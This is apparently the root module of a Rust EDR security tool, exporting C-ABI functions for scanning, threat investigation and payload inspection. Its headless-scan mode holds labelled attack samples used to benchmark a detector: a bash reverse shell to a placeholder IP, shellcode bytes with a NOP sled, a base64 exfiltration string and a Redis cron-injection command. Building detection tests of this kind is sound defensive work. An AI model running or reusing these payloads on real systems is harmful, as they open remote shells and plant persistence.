#[allow(dead_code)]
pub mod ad_blocker;
#[allow(dead_code)]
pub mod contract;
#[allow(dead_code)]
pub mod decision_model;
#[allow(dead_code)]
pub mod edr_engine;
#[allow(dead_code)]
pub mod firewall_ips;
#[cfg(target_os = "macos")]
#[allow(dead_code)]
pub mod gpui_edr;
#[allow(dead_code)]
pub mod lineage_arena;
#[allow(dead_code)]
pub mod platform;
#[allow(dead_code)]
pub mod pretrained_models;
pub mod real_scanner;
#[allow(dead_code)]
pub mod remediation_matrix;
#[allow(dead_code)]
pub mod surgical_actuator;
#[allow(dead_code)]
pub mod telemetry_win;
#[allow(dead_code)]
pub mod threat_intel;
#[cfg(not(target_os = "macos"))]
pub mod ui;
#[allow(dead_code)]
pub mod win_live_os;

/// 统一 C-ABI 版本号 (`2.3.0` -> `0x0002_0300`)
pub const VNB_EDR_ABI_VERSION: u32 = 0x0002_0300;

#[inline]
fn string_to_c_raw(s: String) -> *mut std::os::raw::c_char {
    let clean = if s.contains('\0') {
        s.replace('\0', " ")
    } else {
        s
    };
    std::ffi::CString::new(clean)
        .map(std::ffi::CString::into_raw)
        .unwrap_or(std::ptr::null_mut())
}

fn build_runtime_caps_json_value() -> serde_json::Value {
    let hw = platform::detect_host_hardware_profile();
    let bundle = pretrained_models::PretrainedModelBundle::global();
    serde_json::json!({
        "abi_version": format!("0x{:08x}", VNB_EDR_ABI_VERSION),
        "abi_version_u32": VNB_EDR_ABI_VERSION,
        "shared_lib_filenames": platform::platform_shared_lib_filenames("vnb_edr_gpui"),
        "hardware_profile": hw,
        "dylib_acceleration": bundle.dylib_status_summary(),
        "model_bundle_summary": bundle.model_scale_summary(),
    })
}

/// 返回动态链接库 C-ABI 版本号（供 macOS `dlopen` / Windows `LoadLibraryW` / Linux `dlopen` 启动校验）
#[no_mangle]
pub extern "C" fn vnb_edr_abi_version() -> u32 {
    VNB_EDR_ABI_VERSION
}

/// 导出跨平台运行环境、硬件档位与动态库加载能力 JSON（调用方用 `vnb_edr_free_string` 释放）
#[no_mangle]
pub extern "C" fn vnb_edr_runtime_caps_json() -> *mut std::os::raw::c_char {
    match std::panic::catch_unwind(|| build_runtime_caps_json_value().to_string()) {
        Ok(s) => string_to_c_raw(s),
        Err(_) => std::ptr::null_mut(),
    }
}

/// 释放所有由 `vnb_edr_*` C-ABI 返回的堆分配 C 字符串
#[no_mangle]
pub extern "C" fn vnb_edr_free_string(ptr: *mut std::os::raw::c_char) {
    if !ptr.is_null() {
        unsafe {
            let _ = std::ffi::CString::from_raw(ptr);
        }
    }
}

/// 通过动态链接库创建无头共享 EDR 引擎实例（跨 macOS / Windows / Linux C-ABI）
#[no_mangle]
pub extern "C" fn vnb_edr_engine_create() -> *mut std::ffi::c_void {
    match std::panic::catch_unwind(|| {
        let mut engine = edr_engine::LocalEdrEngine::new_sandboxed();
        engine.run_lightweight_telemetry_tick();
        Box::into_raw(Box::new(engine)).cast::<std::ffi::c_void>()
    }) {
        Ok(p) => p,
        Err(_) => std::ptr::null_mut(),
    }
}

/// 销毁由 `vnb_edr_engine_create` 创建的引擎实例
#[no_mangle]
pub extern "C" fn vnb_edr_engine_destroy(handle: *mut std::ffi::c_void) {
    if !handle.is_null() {
        let _ = std::panic::catch_unwind(|| unsafe {
            let _ = Box::from_raw(handle.cast::<edr_engine::LocalEdrEngine>());
        });
    }
}

/// 通过动态链接库执行一次轻量遥测扫描并返回核心摘要 JSON（调用 `vnb_edr_free_string` 释放）
#[no_mangle]
pub extern "C" fn vnb_edr_engine_scan_and_summary_json(
    handle: *mut std::ffi::c_void,
) -> *mut std::os::raw::c_char {
    if handle.is_null() {
        return std::ptr::null_mut();
    }
    let res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| unsafe {
        let engine = &mut *handle.cast::<edr_engine::LocalEdrEngine>();
        engine.run_lightweight_telemetry_tick();
        serde_json::json!({
            "status": "ok",
            "live_processes": engine.live_processes.len(),
            "active_sockets": engine.active_sockets.len(),
            "alerts": engine.alerts.len(),
            "last_scan_duration_ms": engine.last_scan_duration_ms,
            "firewall_ips_summary": engine.firewall_ips.summary_json(),
            "threat_intel_summary": engine.threat_intel.summary_json(),
        })
        .to_string()
    }));
    match res {
        Ok(s) => string_to_c_raw(s),
        Err(_) => std::ptr::null_mut(),
    }
}

/// 通过动态链接库对指定 IP/路径/Hash 目标执行攻击指纹 + 代码基因 + 多情报库联查并返回报告 JSON
#[no_mangle]
pub extern "C" fn vnb_edr_engine_investigate_json(
    handle: *mut std::ffi::c_void,
    target_utf8: *const std::os::raw::c_char,
) -> *mut std::os::raw::c_char {
    if handle.is_null() || target_utf8.is_null() {
        return std::ptr::null_mut();
    }
    let res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| unsafe {
        let engine = &mut *handle.cast::<edr_engine::LocalEdrEngine>();
        let query = std::ffi::CStr::from_ptr(target_utf8)
            .to_string_lossy()
            .into_owned();
        let rep = engine.run_threat_investigation(
            &query,
            0,
            "ffi_caller",
            None,
            None,
            None,
            None,
        );
        serde_json::to_string(&rep).unwrap_or_else(|_| "{}".to_string())
    }));
    match res {
        Ok(s) => string_to_c_raw(s),
        Err(_) => std::ptr::null_mut(),
    }
}

/// 通过动态链接库对原始网络载荷执行 T5B8 三进制协议检测并返回 JSON（无状态纯函数）
#[no_mangle]
pub extern "C" fn vnb_edr_t5b8_inspect_json(
    payload_ptr: *const u8,
    payload_len: usize,
    proc_name_utf8: *const std::os::raw::c_char,
    local_port: u16,
    remote_port: u16,
    is_wildcard: u8,
) -> *mut std::os::raw::c_char {
    let res = std::panic::catch_unwind(|| unsafe {
        let payload = if payload_ptr.is_null() || payload_len == 0 {
            &[] as &[u8]
        } else {
            std::slice::from_raw_parts(payload_ptr, payload_len.min(1024 * 1024))
        };
        let proc_name = if proc_name_utf8.is_null() {
            "unknown".to_string()
        } else {
            std::ffi::CStr::from_ptr(proc_name_utf8)
                .to_string_lossy()
                .into_owned()
        };
        let r = pretrained_models::inspect_network_payload_t5b8(
            payload,
            &proc_name,
            local_port,
            remote_port,
            is_wildcard != 0,
        );
        serde_json::json!({
            "t5b8_hex": r.t5b8_hex,
            "b8t5_word": r.b8t5_word,
            "t5_regime": r.t5_regime,
            "mac_anomaly_score": r.mac_anomaly_score,
            "recon_error": r.recon_error,
            "is_attack": r.is_attack,
            "attack_class": r.attack_class,
        })
        .to_string()
    });
    match res {
        Ok(s) => string_to_c_raw(s),
        Err(_) => std::ptr::null_mut(),
    }
}

/// C-ABI 动态链接库统一入口（macOS 由 `dlopen("libvnb_edr_gpui.dylib")`、Windows 由 `LoadLibraryW("vnb_edr_gpui.dll")`、Linux 由 `dlopen("libvnb_edr_gpui.so")` 调用）
#[no_mangle]
pub extern "C" fn vnb_edr_run_from_cli() -> i32 {
    let args: Vec<String> = std::env::args().collect();

    if args.iter().any(|a| a == "--abi-info") {
        println!("{}", serde_json::to_string_pretty(&build_runtime_caps_json_value()).unwrap());
        return 0;
    }

    // 1. 支持无头全量真实 EDR 巡检 (--headless-check / --edr-scan)
    if args
        .iter()
        .any(|a| a == "--headless-check" || a == "--edr-scan")
    {
        let edr = edr_engine::LocalEdrEngine::new();
        let hw = platform::detect_host_hardware_profile();
        let real_alerts: Vec<serde_json::Value> = edr
            .alerts
            .iter()
            .map(|a| {
                serde_json::json!({
                    "alert_id": a.alert_id,
                    "domain": a.domain.code(),
                    "severity": a.severity.label(),
                    "pid": a.pid,
                    "ppid": a.ppid,
                    "process": a.process_name,
                    "exe_path": a.exe_path,
                    "title": a.title,
                    "recommended_action": a.decision.chosen_action.symbol(),
                    "llm_verdict": a.llm_verdict,
                    "ancestry_chain": a.ancestry_chain,
                    "cwd": a.cwd,
                    "cmdline": a.cmdline,
                    "entry_script_or_config": a.entry_script_or_config,
                    "sha256_hex": a.sha256_hex,
                    "provenance_hint": a.provenance_hint,
                    "service_unit": a.service_unit,
                    "remote_endpoints": a.remote_endpoints,
                    "holder_processes": a.holder_processes,
                    "injected_modules": a.injected_modules,
                    "window_summary": a.window_summary,
                    "user_and_tty": a.user_and_tty,
                })
            })
            .collect();

        let t5b8_test_cases: Vec<serde_json::Value> = [
            (
                "1. 正常 JSON API 业务请求 (HTTP/REST)",
                b"POST /v1/systemone HTTP/1.1\r\nHost: 127.0.0.1:9006\r\nContent-Type: application/json\r\n\r\n{\"query\": \"status\", \"ok\": true}" as &[u8],
                "vnb-security-assistant",
                54120u16,
                9006u16,
                false,
            ),
            (
                "2. XOR 混淆 Shellcode + NOP Sled 内存注入包",
                &[
                    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96,
                    0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52,
                    0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05, 0xcc, 0xff, 0x90,
                ],
                "unknown_loader",
                51234u16,
                8080u16,
                false,
            ),
            (
                "3. 伪装 443 端口的反弹交互式 Shell (Reverse Shell)",
                b"bash -i >& /dev/tcp/198.51.100.44/4444 0>&1; whoami; uname -a; id\n",
                "curl",
                52110u16,
                4444u16,
                false,
            ),
            (
                "4. DNS/HTTP Base64 高密度隐蔽数据外传隧道",
                b"Q292ZXJ0RGF0YUV4ZmlsdHJhdGlvbkNoYW5uZWxPaytUcnVlKzlmODNhMmMxN2I0ZThlMWY2YTBjM2Q1ZThmMmE0YjZjOGQ5ZTBlMWYyYTNiNGM1ZDY=",
                "python3",
                53901u16,
                53u16,
                false,
            ),
            (
                "5. Redis 未授权 RCE 写入公钥/Crontab 协议注入",
                b"*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\n*1\r\n$8\r\nflushall\r\n",
                "redis-server",
                6379u16,
                49112u16,
                true,
            ),
        ]
        .into_iter()
        .map(|(name, payload, proc_name, lp, rp, wild)| {
            let res = pretrained_models::inspect_network_payload_t5b8(payload, proc_name, lp, rp, wild);
            serde_json::json!({
                "scenario": name,
                "t5b8_hex": res.t5b8_hex,
                "b8t5_hex": format!("0x{:04X}", res.b8t5_word),
                "t5_regime": res.t5_regime,
                "decoded_trits": res.decoded_trits,
                "recon_error_delta": (res.recon_error * 1000.0).round() / 1000.0,
                "mac_anomaly_score": res.mac_anomaly_score,
                "is_attack": res.is_attack,
                "attack_class": res.attack_class,
            })
        })
        .collect();

        let ad_popups_cnt = edr
            .desktop_windows
            .iter()
            .filter(|w| w.is_ad_popup_candidate)
            .count();
        let bundle = pretrained_models::PretrainedModelBundle::global();
        let report = serde_json::json!({
            "status": "ok",
            "engine": "vnb-local-edr v2.3 (Cross-OS Shared Library ABI · WhiteRabbitNeo-7B + AdGuard + Low-Spec Adaptive)",
            "abi_version": format!("0x{:08x}", VNB_EDR_ABI_VERSION),
            "hardware_profile": hw,
            "active_defense_enabled": edr.active_defense_enabled,
            "daemon_agent_installed": edr.daemon_agent_installed,
            "policy_revision": edr.decision_engine.current_revision(),
            "mosaic_memory_slots": edr.decision_engine.mosaic_memory_count(),
            "model_bundle_summary": bundle.model_scale_summary(),
            "dylib_acceleration": bundle.dylib_status_summary(),
            "local_9006_status": edr.local_9006,
            "t5b8_protocol_codec_benchmark": t5b8_test_cases,
            "ad_blocker_summary": {
                "ad_popup_candidates": ad_popups_cnt,
                "blocked_windows_history": edr.window_scanner.blocked_history.len(),
                "pending_ad_cleanup_items": edr.ad_blocker.pending_cleanup_count(),
                "reclaimable_bytes": edr.ad_blocker.pending_reclaimable_bytes(),
                "ad_tracker_connections": edr.ad_blocker.ad_connections.len(),
                "domain_rules_count": edr.ad_blocker.domain_rules.len(),
                "hosts_shield": edr.ad_blocker.hosts_status,
            },
            "firewall_ips_summary": edr.firewall_ips.summary_json(),
            "threat_intel_summary": edr.threat_intel.summary_json(),
            "remediation_matrix_summary": {
                "policy": &edr.remediation_matrix.policy,
                "rules_count": edr.remediation_matrix.summary_cell_matrix().len(),
                "evaluations_count": edr.remediation_matrix.evaluations_count,
                "executed_plans_count": edr.remediation_matrix.executed_plans_count,
                "blocked_by_guardrail_count": edr.remediation_matrix.blocked_by_guardrail_count,
                "circuit_breaker_trips": edr.remediation_matrix.circuit_breaker_trips,
            },
            "telemetry_summary": {
                "live_processes_scanned": edr.live_processes.len(),
                "persistence_entries_scanned": edr.persistence_entries.len(),
                "active_sockets_scanned": edr.active_sockets.len(),
                "fim_and_dropper_records": edr.fim_records.len(),
                "desktop_windows_scanned": edr.desktop_windows.len(),
                "real_alerts_discovered": edr.alerts.len(),
                "last_scan_duration_ms": edr.last_scan_duration_ms,
            },
            "real_host_alerts": real_alerts,
        });
        println!("{}", serde_json::to_string_pretty(&report).unwrap());
        return 0;
    }

    // 2. 支持常驻后台守护进程模式 (--daemon)，并根据主机算力档位自动调节轮询周期
    if args.iter().any(|a| a == "--daemon") {
        let mut edr = edr_engine::LocalEdrEngine::new();
        let hw = platform::detect_host_hardware_profile();
        let tick_secs = hw.edr_tick_interval_secs.max(6);
        println!(
            "[VNB-EDR-DAEMON] 本地 EDR 守护进程已启动 (PID={}, tier={:?}, tick={}s)",
            std::process::id(),
            hw.tier,
            tick_secs
        );
        loop {
            edr.run_lightweight_telemetry_tick();
            std::thread::sleep(std::time::Duration::from_secs(tick_secs));
        }
    }

    // 3. 在 macOS 上启动原生 Zed GPUI (Metal 4) 工作台；在 Windows / Linux 上启动 Ardot/egui 原生桌面工作台
    #[cfg(target_os = "macos")]
    {
        gpui_edr::run_gpui_edr_workbench();
        0
    }
    #[cfg(not(target_os = "macos"))]
    {
        ui::run_windows_edr_workbench()
    }
}
